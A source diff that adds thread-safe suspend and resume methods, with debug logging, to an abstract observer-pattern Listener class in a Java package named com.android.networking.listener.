@@ -10,13 +10,19 @@ package com.android.networking.listener;
 import java.util.ArrayList;
 import java.util.List;
 
+import com.android.networking.auto.Cfg;
 import com.android.networking.interfaces.Observer;
+import com.android.networking.util.Check;
 
 public abstract class Listener<U> {
 	/** The Constant TAG. */
 	private static final String TAG = "Listener"; //$NON-NLS-1$
 
 	protected List<Observer<U>> observers;
+
+	private boolean suspended;
+
+	private Object suspendLock = new Object();
 
 	public Listener() {
 		observers = new ArrayList<Observer<U>>();
@@ -67,6 +73,53 @@ public abstract class Listener<U> {
 		}
 
 		return result;
+	}
+
+	public void suspend() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (suspend)"); //$NON-NLS-1$
+		}
+		synchronized (suspendLock) {
+			if (!suspended) {
+				suspended = true;
+				stop();
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (suspend): not suspended");
+				}
+			}
+		}
+	}
+
+	public void resume() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (resume)"); //$NON-NLS-1$
+		}
+		synchronized (suspendLock) {
+			if (suspended) {
+				suspended = false;
+				start();
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (resume): already suspended");
+				}
+			}
+		}
+	}
+
+	public boolean isSuspended() {
+		synchronized (suspendLock) {
+			return suspended;
+		}
+	}
+
+	protected void setSuspended(boolean value) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (setSuspended): " + value);
+		}
+		synchronized (suspendLock) {
+			suspended = value;
+		}
 	}
 
 	protected abstract void start();
